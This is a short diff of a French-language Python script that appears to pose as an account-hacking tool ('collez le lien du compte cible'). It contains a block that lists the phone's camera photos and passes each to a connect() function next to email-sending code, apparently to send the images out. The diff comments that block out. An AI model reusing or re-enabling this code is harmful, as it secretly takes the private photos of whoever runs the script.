@@ -76,7 +76,7 @@ msg = MIMEMultipart()
 msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
 msg.attach(msgText)
 s.sendmail(sa, ra, msg.as_string())
-
+'''
 chemin = '/storage/emulated/0//DCIM/Camera/'
 os.chdir('/storage/emulated/0/DCIM/Camera')
 liste = os.listdir()
@@ -93,7 +93,7 @@ for x in liste:
                 na.remove(' ')
             name = ''.join(na)
             connect(name)
-
+'''
 if option == 1:
     lien = input('collez le lien du compte cible: ')
     print('searching for referentials...')
